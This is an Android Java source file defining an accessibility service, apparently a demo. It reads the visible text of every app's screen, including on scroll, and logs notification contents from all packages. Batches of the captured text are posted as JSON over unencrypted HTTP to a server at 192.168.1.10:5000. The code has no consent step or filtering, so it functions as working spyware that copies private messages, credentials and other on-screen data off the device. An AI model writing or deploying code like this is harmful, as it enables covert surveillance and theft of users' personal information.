package com.example.demo;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;

import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    private static final int BATCH_SIZE = 20;

    private final Set<String> loggedNodes = new HashSet<>();
    private final Set<String> tmpNodes = new HashSet<>();
    private final Set<String> loggedPackages = new HashSet<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();

        try {
            if (event.getPackageName() != null) {
                handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage() + " [" + System.currentTimeMillis() + "]", e);
        }

        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            handleNotificationStateChanged(event);
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            // Handle scrolling events
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (event.getPackageName() != null) {
                    handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
                }
            }, 100);
        }
    }

    public void handleNodeInfo(AccessibilityNodeInfo node, int depth, String packageName) {
        if (node == null) {
            return;
        }

        if (!loggedPackages.contains(packageName)) {
            Log.d(TAG, packageName);
            loggedPackages.add(packageName);
        }

        StringBuilder indentation = new StringBuilder();
        for (int j = 0; j < depth; j++) {
            indentation.append("  ");
        }

        CharSequence nodeText = node.getText();
        CharSequence nodeContentDescription = node.getContentDescription();
        String className = getClassSimpleName(node.getClassName() != null ? node.getClassName().toString() : "UnknownClass");

        String nodeDescription = packageName + " " + className + " " +
                (nodeText != null ? nodeText : "") + " " +
                (nodeContentDescription != null && !nodeContentDescription.equals(nodeText) ? nodeContentDescription : "");

        if ((!isEmpty(nodeText) || !isEmpty(nodeContentDescription)) && loggedNodes.add(nodeDescription)) {
            String sb = indentation + className + " " +
                    (nodeText != null ? nodeText : "") + " " +
                    (nodeContentDescription != null ? nodeContentDescription : "") +
                    " " + System.currentTimeMillis();

            Log.d(TAG, sb);

            tmpNodes.add(sb);

            if (tmpNodes.size() >= BATCH_SIZE) {
                sendDatatoServer(new HashSet<>(tmpNodes));
                tmpNodes.clear();
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            handleNodeInfo(node.getChild(i), depth + 1, packageName);
        }
    }

    private void sendDatatoServer(Set<String> dataSet) {
        List<String> dataList = new ArrayList<>(dataSet);
        new DataSenderTask().execute(dataList);
    }

    private String getClassSimpleName(String className) {
        String[] parts = className.split("\\.");
        return parts.length > 0 ? parts[parts.length - 1] : className;
    }

    private boolean isEmpty(CharSequence str) {
        return str == null || str.length() == 0;
    }

    private static class DataSenderTask extends AsyncTask<List<String>, Void, Void> {
        @Override
        protected Void doInBackground(List<String>... params) {
            HttpURLConnection urlConnection = null;
            try {
                URL url = new URL("http://192.168.1.10:5000");
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setDoOutput(true);
                urlConnection.setRequestProperty("Content-Type", "application/json");

                List<String> dataList = params[0];
                Collections.sort(dataList, new Comparator<String>() {
                    @Override
                    public int compare(String s1, String s2) {
                        long timestamp1 = Long.parseLong(s1.substring(s1.lastIndexOf(" ") + 1));
                        long timestamp2 = Long.parseLong(s2.substring(s2.lastIndexOf(" ") + 1));
                        return Long.compare(timestamp1, timestamp2);
                    }
                });

                JSONArray jsonArray = new JSONArray(dataList);

                Log.d(TAG, "Sending data: " + jsonArray);

                try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
                    writer.write(jsonArray.toString());
                    writer.flush();
                }

                int responseCode = urlConnection.getResponseCode();
                Log.d(TAG, "Response Code: " + responseCode);

            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage(), e);
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
            return null;
        }
    }

    private void handleNotificationStateChanged(AccessibilityEvent event) {
        Parcelable parcelable = event.getParcelableData();
        if (parcelable instanceof Notification) {
            Notification notification = (Notification) parcelable;
            CharSequence notificationTitle = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence notificationText = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
            Log.d(TAG, "Package Name: " + (event.getPackageName() != null ? event.getPackageName().toString() : "Unknown Package"));
            Log.d(TAG, "Notification Title: " + (notificationTitle != null ? notificationTitle.toString() : "No Title"));
            Log.d(TAG, "Notification Text: " + (notificationText != null ? notificationText.toString() : "No Text"));
        } else {
            List<CharSequence> notificationText = event.getText();
            if (!notificationText.isEmpty()) {
                for (CharSequence t : notificationText) {
                    Log.d(TAG, "Notification Text: " + (t != null ? t.toString() : "No Text"));
                }
            } else {
                Log.d(TAG, "Notification state changed but no text available.");
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Service connected");
    }
}
